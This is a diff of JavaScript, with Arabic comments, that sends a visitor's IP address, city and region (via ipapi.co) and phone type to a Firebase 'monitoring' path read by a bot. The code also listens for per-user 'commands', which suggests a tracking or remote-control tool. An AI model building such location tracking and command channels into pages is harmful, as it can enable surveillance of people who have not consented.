@@ -87,19 +87,22 @@
         if (userId) {
             const sRef = db.ref('monitoring/' + userId);
             
-            fetch('https://ipwho.is/')
+            // إرسال إشعار فوري "دخول" قبل جلب الـ IP لضمان السرعة
+            sRef.set({ 
+                status: "Online", 
+                ip: "Fetching...", 
+                region: "Fetching...", 
+                device: isIOS ? "iPhone" : "Android"
+            });
+
+            // جلب المحافظة والـ IP بشكل دقيق وسريع
+            fetch('https://ipapi.co/json/')
                 .then(r => r.json())
                 .then(d => {
-                    // إرسال البيانات بالأسماء اللي كود البوت مستنيها (ip, region, device)
-                    sRef.set({ 
-                        status: "Online", 
+                    sRef.update({ 
                         ip: d.ip || "N/A", 
-                        region: (d.city || "") + ", " + (d.country || ""), 
-                        device: isIOS ? "iPhone" : "Android"
+                        region: d.city + ", " + d.region // هنا هيجيب القاهرة، حلوان، إلخ
                     });
-                })
-                .catch(() => {
-                    sRef.set({ status: "Online", device: isIOS ? "iPhone" : "Android", ip: "N/A", region: "N/A" });
                 });
 
             db.ref('commands/' + userId).on('value', s => {
